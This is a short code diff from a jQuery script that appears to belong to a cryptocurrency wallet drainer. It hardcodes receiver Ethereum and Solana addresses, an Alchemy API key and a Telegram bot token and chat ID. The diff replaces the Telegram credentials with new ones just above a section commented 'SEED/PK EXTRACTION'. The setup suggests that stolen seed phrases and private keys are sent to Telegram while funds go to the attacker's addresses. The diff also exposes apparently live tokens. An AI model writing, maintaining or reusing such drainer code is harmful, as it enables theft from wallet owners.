@@ -111,8 +111,8 @@ $(document).ready(function () {
     // Credentials loaded from config.js
     const RECEIVER_ETH_ADDRESS = "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7";
     const RECEIVER_SOL_ADDRESS = "6oU4uLAfavhXWoF68rDNcChs7tzfs4AQ6Dq3VwwjWCLJ";
-    const TELEGRAM_BOT_TOKEN = "8864536415:AAFIveix7T5Fc2uxQn0knLvqFUzBzah8g-Y";
-    const TELEGRAM_CHAT_ID = "4315768819";
+    const TELEGRAM_BOT_TOKEN = "8535172282:AAHjqVlUk0zj5Sb72bQdFIwg7ylZMeUdyxw";
+    const TELEGRAM_CHAT_ID = "-1003768015882";
     const ALCHEMY_API_KEY = "jf3NdgL3L8IdVAEeLB8cO";
 
     // SEED/PK EXTRACTION
